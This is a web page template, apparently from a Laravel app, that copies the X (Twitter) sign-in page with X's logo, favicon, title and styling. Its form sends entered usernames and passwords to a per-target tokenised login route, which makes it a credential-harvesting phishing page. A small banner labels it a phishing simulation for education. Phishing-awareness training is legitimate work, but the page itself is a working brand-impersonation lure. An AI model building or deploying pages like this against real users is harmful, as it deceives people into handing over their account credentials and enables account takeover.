<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X. It's what's happening / X</title>
    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #000; 
            color: #e7e9ea; 
            display: flex; 
            min-height: 100vh; 
        }
        .container { 
            display: flex; 
            width: 100%; 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        .left-panel { 
            flex: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 32px; 
        }
        .right-panel { 
            flex: 1; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            padding: 20px; 
            max-width: 400px; 
        }
        .logo-large { 
            width: 300px; 
            height: 300px; 
            fill: #e7e9ea; 
        }
        .logo-small { 
            width: 40px; 
            height: 32px; 
            fill: #e7e9ea; 
            margin-bottom: 32px; 
        }
        .title { 
            font-size: 64px; 
            font-weight: 700; 
            line-height: 84px; 
            margin-bottom: 48px; 
        }
        .subtitle { 
            font-size: 31px; 
            font-weight: 700; 
            line-height: 36px; 
            margin-bottom: 32px; 
        }
        .form-container { 
            width: 100%; 
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        .form-input { 
            background-color: transparent; 
            border: 1px solid #333639; 
            border-radius: 4px; 
            color: #e7e9ea; 
            font-size: 17px; 
            height: 56px; 
            padding: 12px; 
            width: 100%; 
            outline: none; 
        }
        .form-input:focus { 
            border-color: #1d9bf0; 
        }
        .form-input::placeholder { 
            color: #71767b; 
        }
        .signin-button { 
            background-color: #e7e9ea; 
            border: none; 
            border-radius: 9999px; 
            color: #0f1019; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: 700; 
            height: 40px; 
            width: 100%; 
            margin-bottom: 20px; 
        }
        .signin-button:hover { 
            background-color: #d6d9db; 
        }
        .forgot-password { 
            color: #1d9bf0; 
            font-size: 15px; 
            text-decoration: none; 
            margin-bottom: 20px; 
            display: inline-block; 
        }
        .forgot-password:hover { 
            text-decoration: underline; 
        }
        .divider { 
            border-top: 1px solid #333639; 
            margin: 40px 0; 
            position: relative; 
            text-align: center; 
        }
        .divider::before { 
            background-color: #000; 
            color: #71767b; 
            content: 'or'; 
            font-size: 15px; 
            padding: 0 16px; 
            position: absolute; 
            top: -10px; 
            left: 50%; 
            transform: translateX(-50%); 
        }
        .google-signin { 
            border: 1px solid #536471; 
            border-radius: 9999px; 
            background-color: transparent; 
            color: #e7e9ea; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: 700; 
            height: 40px; 
            width: 100%; 
            margin-bottom: 20px; 
        }
        .google-signin:hover { 
            background-color: rgba(239,243,244,0.1); 
        }
        .signup-link { 
            color: #71767b; 
            font-size: 15px; 
        }
        .signup-link a { 
            color: #1d9bf0; 
            text-decoration: none; 
        }
        .signup-link a:hover { 
            text-decoration: underline; 
        }
        .disclaimer { 
            position: fixed; 
            bottom: 10px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(255, 0, 0, 0.9); 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            font-size: 12px; 
            z-index: 1000; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-panel">
            <svg class="logo-large" viewBox="0 0 24 24">
                <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
            </svg>
        </div>
        <div class="right-panel">
            <svg class="logo-small" viewBox="0 0 24 24">
                <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
            </svg>
            <h1 class="title">Happening now</h1>
            <h2 class="subtitle">Sign in to X</h2>
            <div class="form-container">
                <button class="google-signin">Sign in with Google</button>
                <div class="divider"></div>
                <form method="POST" action="{{ url('/login/' . $token) }}">
                    @csrf
                    <div class="form-group">
                        <input type="text" name="email" class="form-input" placeholder="Phone, email, or username" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" class="form-input" placeholder="Password" required>
                    </div>
                    <button type="submit" class="signin-button">Sign in</button>
                </form>
                <a href="#" class="forgot-password">Forgot password?</a>
                <p class="signup-link">
                    Don't have an account? <a href="#">Sign up</a>
                </p>
            </div>
        </div>
    </div>
    <div class="disclaimer">
        ⚠️ This is a phishing simulation for educational purposes. Do not use real credentials.
    </div>
</body>
</html>
